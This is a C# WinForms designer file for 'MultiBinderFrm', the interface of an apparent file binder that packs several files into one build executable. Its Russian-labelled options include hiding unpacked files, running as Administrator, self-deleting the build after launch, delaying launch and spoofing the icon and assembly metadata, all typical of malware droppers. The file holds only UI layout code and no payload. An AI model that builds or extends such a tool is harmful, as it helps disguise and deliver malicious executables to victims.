namespace R3BinderTools.Compilation.CodeDOM
{
    partial class MultiBinderFrm
    {
        /// <summary> 
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором компонентов

        /// <summary> 
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.DragInfo = new System.Windows.Forms.Label();
            this.CountFiles = new System.Windows.Forms.Label();
            this.ListFiles = new System.Windows.Forms.ListBox();
            this.MenuFiles = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.AddFileItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SeparatorOne = new System.Windows.Forms.ToolStripSeparator();
            this.RemoveFileItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SeparatorTwo = new System.Windows.Forms.ToolStripSeparator();
            this.CleanAllItems = new System.Windows.Forms.ToolStripMenuItem();
            this.AssVerText = new System.Windows.Forms.Label();
            this.AssVerTextBox = new System.Windows.Forms.TextBox();
            this.AssGuidText = new System.Windows.Forms.Label();
            this.AssGuidTextBox = new System.Windows.Forms.TextBox();
            this.AssCompanyText = new System.Windows.Forms.Label();
            this.AssCompanyTextBox = new System.Windows.Forms.TextBox();
            this.AssFVText = new System.Windows.Forms.Label();
            this.AssFileVerTextBox = new System.Windows.Forms.TextBox();
            this.AssCopyText = new System.Windows.Forms.Label();
            this.AssCopyrightTextBox = new System.Windows.Forms.TextBox();
            this.AssProdText = new System.Windows.Forms.Label();
            this.AssProductTextBox = new System.Windows.Forms.TextBox();
            this.AssDescText = new System.Windows.Forms.Label();
            this.AssDescriptTextBox = new System.Windows.Forms.TextBox();
            this.AssTitleText = new System.Windows.Forms.Label();
            this.AssTitleTextBox = new System.Windows.Forms.TextBox();
            this.LsizeIco = new System.Windows.Forms.Label();
            this.IcoViewer = new System.Windows.Forms.PictureBox();
            this.IconText = new System.Windows.Forms.Label();
            this.IconTextBox = new System.Windows.Forms.TextBox();
            this.StatusCompile = new System.Windows.Forms.Label();
            this.HideFilesBox = new R3BinderTools.Design.BinderBox();
            this.AddIcoBox = new R3BinderTools.Design.BinderBox();
            this.AdmRunFilesBox = new R3BinderTools.Design.BinderBox();
            this.AdmRunBuildBox = new R3BinderTools.Design.BinderBox();
            this.SuicideBuildBox = new R3BinderTools.Design.BinderBox();
            this.RunTimeBox = new R3BinderTools.Design.BinderBox();
            this.AutoGenAss = new R3BinderTools.Design.BindButton();
            this.CreateBuild = new R3BinderTools.Design.BindButton();
            this.MenuFiles.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.IcoViewer)).BeginInit();
            this.SuspendLayout();
            // 
            // DragInfo
            // 
            this.DragInfo.AutoSize = true;
            this.DragInfo.ForeColor = System.Drawing.SystemColors.ControlLight;
            this.DragInfo.Location = new System.Drawing.Point(611, 4);
            this.DragInfo.Name = "DragInfo";
            this.DragInfo.Size = new System.Drawing.Size(83, 13);
            this.DragInfo.TabIndex = 155;
            this.DragInfo.Text = "[Drag and Drop]";
            // 
            // CountFiles
            // 
            this.CountFiles.AutoSize = true;
            this.CountFiles.ForeColor = System.Drawing.SystemColors.ControlLight;
            this.CountFiles.Location = new System.Drawing.Point(1, 3);
            this.CountFiles.Name = "CountFiles";
            this.CountFiles.Size = new System.Drawing.Size(181, 13);
            this.CountFiles.TabIndex = 154;
            this.CountFiles.Text = "Список файлов для соединения: 0";
            // 
            // ListFiles
            // 
            this.ListFiles.AllowDrop = true;
            this.ListFiles.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.ListFiles.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.ListFiles.ContextMenuStrip = this.MenuFiles;
            this.ListFiles.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.ListFiles.FormattingEnabled = true;
            this.ListFiles.Location = new System.Drawing.Point(4, 21);
            this.ListFiles.Name = "ListFiles";
            this.ListFiles.Size = new System.Drawing.Size(689, 106);
            this.ListFiles.Sorted = true;
            this.ListFiles.TabIndex = 153;
            this.ListFiles.TabStop = false;
            this.ListFiles.UseTabStops = false;
            this.ListFiles.DragDrop += new System.Windows.Forms.DragEventHandler(this.ListFiles_DragDrop);
            this.ListFiles.DragEnter += new System.Windows.Forms.DragEventHandler(this.ListFiles_DragEnter);
            // 
            // MenuFiles
            // 
            this.MenuFiles.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.MenuFiles.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.AddFileItem,
            this.SeparatorOne,
            this.RemoveFileItem,
            this.SeparatorTwo,
            this.CleanAllItems});
            this.MenuFiles.Name = "MenuFiles";
            this.MenuFiles.ShowImageMargin = false;
            this.MenuFiles.ShowItemToolTips = false;
            this.MenuFiles.Size = new System.Drawing.Size(211, 82);
            // 
            // AddFileItem
            // 
            this.AddFileItem.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.AddFileItem.ImageTransparentColor = System.Drawing.Color.DarkGray;
            this.AddFileItem.Name = "AddFileItem";
            this.AddFileItem.Size = new System.Drawing.Size(210, 22);
            this.AddFileItem.Text = "Добавить файл в список";
            this.AddFileItem.Click += new System.EventHandler(this.AddFileItem_Click);
            // 
            // SeparatorOne
            // 
            this.SeparatorOne.Name = "SeparatorOne";
            this.SeparatorOne.Size = new System.Drawing.Size(207, 6);
            // 
            // RemoveFileItem
            // 
            this.RemoveFileItem.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.RemoveFileItem.Name = "RemoveFileItem";
            this.RemoveFileItem.Size = new System.Drawing.Size(210, 22);
            this.RemoveFileItem.Text = "Удалить выбранный элемент";
            this.RemoveFileItem.Click += new System.EventHandler(this.RemoveFileItem_Click);
            // 
            // SeparatorTwo
            // 
            this.SeparatorTwo.Name = "SeparatorTwo";
            this.SeparatorTwo.Size = new System.Drawing.Size(207, 6);
            // 
            // CleanAllItems
            // 
            this.CleanAllItems.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.CleanAllItems.Name = "CleanAllItems";
            this.CleanAllItems.Size = new System.Drawing.Size(210, 22);
            this.CleanAllItems.Text = "Очистить все элементы";
            this.CleanAllItems.Click += new System.EventHandler(this.CleanAllItems_Click);
            // 
            // AssVerText
            // 
            this.AssVerText.AutoSize = true;
            this.AssVerText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssVerText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssVerText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssVerText.Location = new System.Drawing.Point(7, 345);
            this.AssVerText.Name = "AssVerText";
            this.AssVerText.Size = new System.Drawing.Size(98, 13);
            this.AssVerText.TabIndex = 172;
            this.AssVerText.Text = "AssemblyVersion:";
            // 
            // AssVerTextBox
            // 
            this.AssVerTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssVerTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssVerTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssVerTextBox.Location = new System.Drawing.Point(129, 341);
            this.AssVerTextBox.MaxLength = 7;
            this.AssVerTextBox.Name = "AssVerTextBox";
            this.AssVerTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssVerTextBox.TabIndex = 171;
            this.AssVerTextBox.TabStop = false;
            this.AssVerTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssGuidText
            // 
            this.AssGuidText.AutoSize = true;
            this.AssGuidText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssGuidText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssGuidText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssGuidText.Location = new System.Drawing.Point(7, 389);
            this.AssGuidText.Name = "AssGuidText";
            this.AssGuidText.Size = new System.Drawing.Size(83, 13);
            this.AssGuidText.TabIndex = 170;
            this.AssGuidText.Text = "AssemblyGuid:";
            // 
            // AssGuidTextBox
            // 
            this.AssGuidTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssGuidTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssGuidTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssGuidTextBox.Location = new System.Drawing.Point(129, 384);
            this.AssGuidTextBox.MaxLength = 7;
            this.AssGuidTextBox.Name = "AssGuidTextBox";
            this.AssGuidTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssGuidTextBox.TabIndex = 169;
            this.AssGuidTextBox.TabStop = false;
            this.AssGuidTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssCompanyText
            // 
            this.AssCompanyText.AutoSize = true;
            this.AssCompanyText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssCompanyText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssCompanyText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssCompanyText.Location = new System.Drawing.Point(7, 282);
            this.AssCompanyText.Name = "AssCompanyText";
            this.AssCompanyText.Size = new System.Drawing.Size(105, 13);
            this.AssCompanyText.TabIndex = 168;
            this.AssCompanyText.Text = "AssemblyCompany:";
            // 
            // AssCompanyTextBox
            // 
            this.AssCompanyTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssCompanyTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssCompanyTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssCompanyTextBox.Location = new System.Drawing.Point(129, 278);
            this.AssCompanyTextBox.MaxLength = 100;
            this.AssCompanyTextBox.Name = "AssCompanyTextBox";
            this.AssCompanyTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssCompanyTextBox.TabIndex = 167;
            this.AssCompanyTextBox.TabStop = false;
            this.AssCompanyTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssFVText
            // 
            this.AssFVText.AutoSize = true;
            this.AssFVText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssFVText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssFVText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssFVText.Location = new System.Drawing.Point(7, 367);
            this.AssFVText.Name = "AssFVText";
            this.AssFVText.Size = new System.Drawing.Size(117, 13);
            this.AssFVText.TabIndex = 166;
            this.AssFVText.Text = "AssemblyFileVersion:";
            // 
            // AssFileVerTextBox
            // 
            this.AssFileVerTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssFileVerTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssFileVerTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssFileVerTextBox.Location = new System.Drawing.Point(129, 363);
            this.AssFileVerTextBox.MaxLength = 7;
            this.AssFileVerTextBox.Name = "AssFileVerTextBox";
            this.AssFileVerTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssFileVerTextBox.TabIndex = 165;
            this.AssFileVerTextBox.TabStop = false;
            this.AssFileVerTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssCopyText
            // 
            this.AssCopyText.AutoSize = true;
            this.AssCopyText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssCopyText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssCopyText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssCopyText.Location = new System.Drawing.Point(7, 324);
            this.AssCopyText.Name = "AssCopyText";
            this.AssCopyText.Size = new System.Drawing.Size(108, 13);
            this.AssCopyText.TabIndex = 164;
            this.AssCopyText.Text = "AssemblyCopyright:";
            // 
            // AssCopyrightTextBox
            // 
            this.AssCopyrightTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssCopyrightTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssCopyrightTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssCopyrightTextBox.Location = new System.Drawing.Point(129, 320);
            this.AssCopyrightTextBox.MaxLength = 100;
            this.AssCopyrightTextBox.Name = "AssCopyrightTextBox";
            this.AssCopyrightTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssCopyrightTextBox.TabIndex = 163;
            this.AssCopyrightTextBox.TabStop = false;
            this.AssCopyrightTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssProdText
            // 
            this.AssProdText.AutoSize = true;
            this.AssProdText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssProdText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssProdText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssProdText.Location = new System.Drawing.Point(7, 303);
            this.AssProdText.Name = "AssProdText";
            this.AssProdText.Size = new System.Drawing.Size(98, 13);
            this.AssProdText.TabIndex = 162;
            this.AssProdText.Text = "AssemblyProduct:";
            // 
            // AssProductTextBox
            // 
            this.AssProductTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssProductTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssProductTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssProductTextBox.Location = new System.Drawing.Point(129, 299);
            this.AssProductTextBox.MaxLength = 100;
            this.AssProductTextBox.Name = "AssProductTextBox";
            this.AssProductTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssProductTextBox.TabIndex = 161;
            this.AssProductTextBox.TabStop = false;
            this.AssProductTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssDescText
            // 
            this.AssDescText.AutoSize = true;
            this.AssDescText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssDescText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssDescText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssDescText.Location = new System.Drawing.Point(7, 261);
            this.AssDescText.Name = "AssDescText";
            this.AssDescText.Size = new System.Drawing.Size(116, 13);
            this.AssDescText.TabIndex = 160;
            this.AssDescText.Text = "AssemblyDescription:";
            // 
            // AssDescriptTextBox
            // 
            this.AssDescriptTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssDescriptTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssDescriptTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssDescriptTextBox.Location = new System.Drawing.Point(129, 257);
            this.AssDescriptTextBox.MaxLength = 100;
            this.AssDescriptTextBox.Name = "AssDescriptTextBox";
            this.AssDescriptTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssDescriptTextBox.TabIndex = 159;
            this.AssDescriptTextBox.TabStop = false;
            this.AssDescriptTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // AssTitleText
            // 
            this.AssTitleText.AutoSize = true;
            this.AssTitleText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.AssTitleText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssTitleText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.AssTitleText.Location = new System.Drawing.Point(7, 240);
            this.AssTitleText.Name = "AssTitleText";
            this.AssTitleText.Size = new System.Drawing.Size(82, 13);
            this.AssTitleText.TabIndex = 158;
            this.AssTitleText.Text = "AssemblyTitle:";
            // 
            // AssTitleTextBox
            // 
            this.AssTitleTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.AssTitleTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.AssTitleTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.AssTitleTextBox.Location = new System.Drawing.Point(129, 236);
            this.AssTitleTextBox.MaxLength = 100;
            this.AssTitleTextBox.Name = "AssTitleTextBox";
            this.AssTitleTextBox.Size = new System.Drawing.Size(230, 20);
            this.AssTitleTextBox.TabIndex = 157;
            this.AssTitleTextBox.TabStop = false;
            this.AssTitleTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // LsizeIco
            // 
            this.LsizeIco.AutoSize = true;
            this.LsizeIco.Font = new System.Drawing.Font("Palatino Linotype", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LsizeIco.ForeColor = System.Drawing.SystemColors.ControlLight;
            this.LsizeIco.Location = new System.Drawing.Point(126, 200);
            this.LsizeIco.Name = "LsizeIco";
            this.LsizeIco.Size = new System.Drawing.Size(0, 16);
            this.LsizeIco.TabIndex = 175;
            this.LsizeIco.Visible = false;
            // 
            // IcoViewer
            // 
            this.IcoViewer.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.IcoViewer.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.IcoViewer.Location = new System.Drawing.Point(8, 172);
            this.IcoViewer.Name = "IcoViewer";
            this.IcoViewer.Size = new System.Drawing.Size(93, 54);
            this.IcoViewer.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.IcoViewer.TabIndex = 174;
            this.IcoViewer.TabStop = false;
            // 
            // IconText
            // 
            this.IconText.AutoSize = true;
            this.IconText.Font = new System.Drawing.Font("Georgia", 7.25F);
            this.IconText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.IconText.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.IconText.Location = new System.Drawing.Point(5, 130);
            this.IconText.Name = "IconText";
            this.IconText.Size = new System.Drawing.Size(210, 13);
            this.IconText.TabIndex = 177;
            this.IconText.Text = "Путь к файлу иконки для билд файла:";
            // 
            // IconTextBox
            // 
            this.IconTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.IconTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.IconTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(196)))), ((int)(((byte)(198)))), ((int)(((byte)(202)))));
            this.IconTextBox.Location = new System.Drawing.Point(8, 146);
            this.IconTextBox.MaxLength = 100;
            this.IconTextBox.Name = "IconTextBox";
            this.IconTextBox.ReadOnly = true;
            this.IconTextBox.Size = new System.Drawing.Size(351, 20);
            this.IconTextBox.TabIndex = 176;
            this.IconTextBox.TabStop = false;
            // 
            // StatusCompile
            // 
            this.StatusCompile.AutoSize = true;
            this.StatusCompile.ForeColor = System.Drawing.Color.GreenYellow;
            this.StatusCompile.Location = new System.Drawing.Point(500, 392);
            this.StatusCompile.Name = "StatusCompile";
            this.StatusCompile.Size = new System.Drawing.Size(0, 13);
            this.StatusCompile.TabIndex = 184;
            // 
            // HideFilesBox
            // 
            this.HideFilesBox.AutoSize = true;
            this.HideFilesBox.BackColor = System.Drawing.Color.Transparent;
            this.HideFilesBox.Location = new System.Drawing.Point(442, 252);
            this.HideFilesBox.Name = "HideFilesBox";
            this.HideFilesBox.Size = new System.Drawing.Size(212, 20);
            this.HideFilesBox.TabIndex = 185;
            this.HideFilesBox.TabStop = false;
            this.HideFilesBox.Text = "Скрывать файлы после распаковки";
            this.HideFilesBox.UseVisualStyleBackColor = false;
            // 
            // AddIcoBox
            // 
            this.AddIcoBox.AutoSize = true;
            this.AddIcoBox.BackColor = System.Drawing.Color.Transparent;
            this.AddIcoBox.Location = new System.Drawing.Point(107, 173);
            this.AddIcoBox.Name = "AddIcoBox";
            this.AddIcoBox.Size = new System.Drawing.Size(202, 20);
            this.AddIcoBox.TabIndex = 183;
            this.AddIcoBox.TabStop = false;
            this.AddIcoBox.Text = "Добавить иконку для билд файла";
            this.AddIcoBox.UseVisualStyleBackColor = false;
            this.AddIcoBox.CheckedChanged += new System.EventHandler(this.AddIcoBox_CheckedChanged);
            // 
            // AdmRunFilesBox
            // 
            this.AdmRunFilesBox.AutoSize = true;
            this.AdmRunFilesBox.BackColor = System.Drawing.Color.Transparent;
            this.AdmRunFilesBox.Location = new System.Drawing.Point(442, 226);
            this.AdmRunFilesBox.Name = "AdmRunFilesBox";
            this.AdmRunFilesBox.Size = new System.Drawing.Size(210, 20);
            this.AdmRunFilesBox.TabIndex = 182;
            this.AdmRunFilesBox.TabStop = false;
            this.AdmRunFilesBox.Text = "Запуск файлов от Администратора";
            this.AdmRunFilesBox.UseVisualStyleBackColor = false;
            // 
            // AdmRunBuildBox
            // 
            this.AdmRunBuildBox.AutoSize = true;
            this.AdmRunBuildBox.BackColor = System.Drawing.Color.Transparent;
            this.AdmRunBuildBox.Location = new System.Drawing.Point(442, 200);
            this.AdmRunBuildBox.Name = "AdmRunBuildBox";
            this.AdmRunBuildBox.Size = new System.Drawing.Size(233, 20);
            this.AdmRunBuildBox.TabIndex = 181;
            this.AdmRunBuildBox.TabStop = false;
            this.AdmRunBuildBox.Text = "Запуск билд файла от Администратора";
            this.AdmRunBuildBox.UseVisualStyleBackColor = false;
            this.AdmRunBuildBox.CheckedChanged += new System.EventHandler(this.AdmRunBuildBox_CheckedChanged);
            // 
            // SuicideBuildBox
            // 
            this.SuicideBuildBox.AutoSize = true;
            this.SuicideBuildBox.BackColor = System.Drawing.Color.Transparent;
            this.SuicideBuildBox.Location = new System.Drawing.Point(442, 173);
            this.SuicideBuildBox.Name = "SuicideBuildBox";
            this.SuicideBuildBox.Size = new System.Drawing.Size(251, 20);
            this.SuicideBuildBox.TabIndex = 180;
            this.SuicideBuildBox.TabStop = false;
            this.SuicideBuildBox.Text = "Само-удаление билд файла после запуска";
            this.SuicideBuildBox.UseVisualStyleBackColor = false;
            // 
            // RunTimeBox
            // 
            this.RunTimeBox.AutoSize = true;
            this.RunTimeBox.BackColor = System.Drawing.Color.Transparent;
            this.RunTimeBox.Location = new System.Drawing.Point(442, 146);
            this.RunTimeBox.Name = "RunTimeBox";
            this.RunTimeBox.Size = new System.Drawing.Size(203, 20);
            this.RunTimeBox.TabIndex = 179;
            this.RunTimeBox.TabStop = false;
            this.RunTimeBox.Text = "Делать задержку перед запуском";
            this.RunTimeBox.UseVisualStyleBackColor = false;
            // 
            // AutoGenAss
            // 
            this.AutoGenAss.BackColor = System.Drawing.Color.Transparent;
            this.AutoGenAss.BGColor = "#508ef5";
            this.AutoGenAss.FontColor = "#ffffff";
            this.AutoGenAss.Location = new System.Drawing.Point(10, 412);
            this.AutoGenAss.Name = "AutoGenAss";
            this.AutoGenAss.Size = new System.Drawing.Size(349, 26);
            this.AutoGenAss.TabIndex = 186;
            this.AutoGenAss.TabStop = false;
            this.AutoGenAss.Text = "Сгенерировать свойства для билд файла";
            this.AutoGenAss.Click += new System.EventHandler(this.AutoGenAss_Click);
            // 
            // CreateBuild
            // 
            this.CreateBuild.BackColor = System.Drawing.Color.Transparent;
            this.CreateBuild.BGColor = "#508ef5";
            this.CreateBuild.FontColor = "#ffffff";
            this.CreateBuild.Location = new System.Drawing.Point(435, 412);
            this.CreateBuild.Name = "CreateBuild";
            this.CreateBuild.Size = new System.Drawing.Size(258, 26);
            this.CreateBuild.TabIndex = 187;
            this.CreateBuild.TabStop = false;
            this.CreateBuild.Text = "Создать новый билд";
            this.CreateBuild.Click += new System.EventHandler(this.CreateBuild_Click);
            // 
            // MultiBinderFrm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.Controls.Add(this.CreateBuild);
            this.Controls.Add(this.AutoGenAss);
            this.Controls.Add(this.HideFilesBox);
            this.Controls.Add(this.StatusCompile);
            this.Controls.Add(this.AddIcoBox);
            this.Controls.Add(this.AdmRunFilesBox);
            this.Controls.Add(this.AdmRunBuildBox);
            this.Controls.Add(this.SuicideBuildBox);
            this.Controls.Add(this.RunTimeBox);
            this.Controls.Add(this.IconText);
            this.Controls.Add(this.IconTextBox);
            this.Controls.Add(this.LsizeIco);
            this.Controls.Add(this.IcoViewer);
            this.Controls.Add(this.AssVerText);
            this.Controls.Add(this.AssVerTextBox);
            this.Controls.Add(this.AssGuidText);
            this.Controls.Add(this.AssGuidTextBox);
            this.Controls.Add(this.AssCompanyText);
            this.Controls.Add(this.AssCompanyTextBox);
            this.Controls.Add(this.AssFVText);
            this.Controls.Add(this.AssFileVerTextBox);
            this.Controls.Add(this.AssCopyText);
            this.Controls.Add(this.AssCopyrightTextBox);
            this.Controls.Add(this.AssProdText);
            this.Controls.Add(this.AssProductTextBox);
            this.Controls.Add(this.AssDescText);
            this.Controls.Add(this.AssDescriptTextBox);
            this.Controls.Add(this.AssTitleText);
            this.Controls.Add(this.AssTitleTextBox);
            this.Controls.Add(this.DragInfo);
            this.Controls.Add(this.CountFiles);
            this.Controls.Add(this.ListFiles);
            this.Name = "MultiBinderFrm";
            this.Size = new System.Drawing.Size(696, 443);
            this.Load += new System.EventHandler(this.MultiBinderFrm_Load);
            this.MenuFiles.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.IcoViewer)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label DragInfo;
        private System.Windows.Forms.Label CountFiles;
        private System.Windows.Forms.ListBox ListFiles;
        private System.Windows.Forms.ContextMenuStrip MenuFiles;
        private System.Windows.Forms.ToolStripMenuItem AddFileItem;
        private System.Windows.Forms.ToolStripSeparator SeparatorOne;
        private System.Windows.Forms.ToolStripMenuItem RemoveFileItem;
        private System.Windows.Forms.ToolStripSeparator SeparatorTwo;
        private System.Windows.Forms.ToolStripMenuItem CleanAllItems;
        private System.Windows.Forms.Label AssVerText;
        private System.Windows.Forms.TextBox AssVerTextBox;
        private System.Windows.Forms.Label AssGuidText;
        private System.Windows.Forms.TextBox AssGuidTextBox;
        private System.Windows.Forms.Label AssCompanyText;
        private System.Windows.Forms.TextBox AssCompanyTextBox;
        private System.Windows.Forms.Label AssFVText;
        private System.Windows.Forms.TextBox AssFileVerTextBox;
        private System.Windows.Forms.Label AssCopyText;
        private System.Windows.Forms.TextBox AssCopyrightTextBox;
        private System.Windows.Forms.Label AssProdText;
        private System.Windows.Forms.TextBox AssProductTextBox;
        private System.Windows.Forms.Label AssDescText;
        private System.Windows.Forms.TextBox AssDescriptTextBox;
        private System.Windows.Forms.Label AssTitleText;
        private System.Windows.Forms.TextBox AssTitleTextBox;
        private System.Windows.Forms.Label LsizeIco;
        private System.Windows.Forms.PictureBox IcoViewer;
        private System.Windows.Forms.Label IconText;
        private System.Windows.Forms.TextBox IconTextBox;
        private Design.BinderBox RunTimeBox;
        private Design.BinderBox SuicideBuildBox;
        private Design.BinderBox AdmRunBuildBox;
        private Design.BinderBox AdmRunFilesBox;
        private Design.BinderBox AddIcoBox;
        private System.Windows.Forms.Label StatusCompile;
        private Design.BinderBox HideFilesBox;
        private Design.BindButton AutoGenAss;
        private Design.BindButton CreateBuild;
    }
}
